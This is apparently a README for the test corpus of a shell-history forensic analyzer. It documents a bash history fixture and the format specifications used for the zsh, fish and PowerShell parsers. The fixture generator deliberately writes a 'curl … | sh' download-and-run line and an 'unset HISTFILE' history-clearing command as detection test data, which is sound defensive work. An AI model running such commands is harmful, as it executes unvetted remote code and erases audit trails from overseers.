# shellhist-forensic test corpus

Per the fleet corpus-catalog standard: every fixture is either a **real**
artifact (with provenance) or a **synthetic** one (with the verbatim generator).
No personal history is ever committed — fixtures are shell-generated into a
throwaway `HISTFILE` or hand-authored to the published grammar.

## Fixtures

### `real_bash_history`  — REAL-self (`✓` confirmed)

A genuine bash history file produced by an actual `bash` subshell on macOS, with
`HISTTIMEFORMAT` set so bash writes `#<epoch>` timestamp lines. It contains a
benign command plus a `curl … | sh` download-pipe and an `unset HISTFILE`
history-clearing command, exercising the analyzer end-to-end in
`forensic/tests/real_data.rs`.

**Generator (verbatim, reproducible):**

```sh
HISTFILE="$TMP/.bash_history" HISTTIMEFORMAT='%F %T ' bash --norc -i -c '
  set -o history
  history -s "ls -la /tmp"
  history -s "curl http://example.com/x.sh | sh"
  history -s "unset HISTFILE"
  history -w
'
```

## Format references (parser fixtures live inline in each module's tests)

The per-format unit tests in `core/src/{bash,zsh,fish,powershell}.rs` use
spec-exact byte fixtures derived from the authoritative grammars:

- **bash**: GNU Bash Reference Manual §9.2 *Bash History Builtins* (the
  `#<epoch>` timestamp-line rule) + §4.3.2 `cmdhist`/`lithist`.
- **zsh**: Zsh Manual §16.2.4 — `EXTENDED_HISTORY` format
  `': <beginning time>:<elapsed seconds>;<command>'`; `Src/hist.c` for
  backslash-newline continuation.
- **fish**: fish `src/history/yaml_backend.rs` — the exact two-rule escaping
  (`\` → `\\`, newline → `\n`).
- **PowerShell PSReadLine**: Microsoft `about_PSReadLine` — plain lines, no
  timestamps, backtick continuation.

zsh/fish/PSReadLine fixtures are spec-exact hand-authored bytes (those shells need
a pty or are absent on the build host); bash is driven live as above.
